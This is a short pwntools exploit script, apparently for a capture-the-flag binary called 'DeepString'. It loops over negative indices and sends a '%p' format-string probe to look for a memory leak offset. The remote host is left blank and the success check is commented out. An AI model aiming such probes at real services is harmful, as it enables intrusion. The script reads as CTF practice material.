#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './DeepString'
elf = context.binary = ELF(exe, checksec=True)
# libc = '/lib/x86_64-linux-gnu/libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    # io = initialize()
    rop = ROP(exe)

    for i in range(-100, 0):
        io = initialize()
        try:
            io.sendline(f'{i}'.encode())
            io.sendline(b'%p')
            response = io.recv()
            # print(response)
            # if b'0x' in response:
            #     # success(f'Found offset at: {i}')
            #     print(f'Found offset at: {i}')
        except BaseException:
            print('Didnt worked')
            io.close()

    io.interactive()
    
if __name__ == '__main__':
    exploit()